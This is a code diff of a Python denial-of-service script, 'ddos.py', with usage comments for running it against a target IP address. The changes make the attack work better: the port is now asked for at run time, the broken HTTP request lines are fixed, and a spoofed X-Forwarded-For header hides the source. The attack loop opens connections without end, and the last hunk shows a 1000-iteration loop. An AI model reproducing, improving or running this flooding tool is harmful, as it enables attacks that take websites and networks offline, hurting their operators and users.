@@ -1,6 +1,6 @@
 # How to use
 #Enter the directory DDOS
-#Run the command in the terminal py ddos.py -i (the desired ip address)
+#Run this command in the terminal (py ddos.py -i (the desired ip address))
 #Example : py ddos.py -i 192.168.70.235
 #click enter
 
@@ -21,16 +21,18 @@ if __name__ == "__main__":
     argu = parser.parse_args()
     
 target = f'{argu.ip}' # could be the ip address of your router or domain name of a wabsite
-port = 80 # The port matters in the DDOS, 80 is used in http attack
-fake_ip = input('Input a cover ip: ')# (fake ip) Stays as the header of the attack
+port_num = input("Input port number: ")# The port matters in the DDOS, 80 is used in http attack
+port = int(port_num)
+fake_ip = input("Input fake ip: ")# (fake ip) Stays as the header of the attack
 
 def attack():
     # Endless loop opening socket connection
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target,port))
-        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
-        s.sendto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target,port))
+        s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
+        s.send(("Host: " + target + "\r\n").encode('ascii'))  # Send target as the host
+        s.send(("X-Forwarded-For: " + fake_ip + "\r\n\r\n").encode('ascii'))  # Send fake_ip as X-Forwarded-For header
         s.close()
 
 for i in range(1000):
